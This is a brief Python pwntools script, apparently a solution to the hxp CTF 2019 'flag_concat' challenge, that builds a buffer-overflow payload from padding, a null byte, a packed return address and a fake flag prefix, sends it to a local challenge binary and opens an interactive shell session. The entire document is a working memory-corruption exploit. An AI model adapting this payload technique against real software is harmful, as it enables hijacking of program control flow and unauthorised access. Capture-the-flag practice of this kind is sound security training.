# https://ctf.harrisongreen.me/2019/hxpctf/flag_concat/

from pwn import *

r = process(['./ld-2.24.so', '--library-path',  './',  './vuln'])
dat = ''
dat += '0'*25
dat += '\x00'

dat += '0'*174
dat += p64(0x004007b6)
dat += '0'*(234-174-9)

dat += 'hxp{'
dat += '0' * 39


print len(dat)
#gdb.attach(r)
r.sendlineafter(':', dat)

r.interactive()
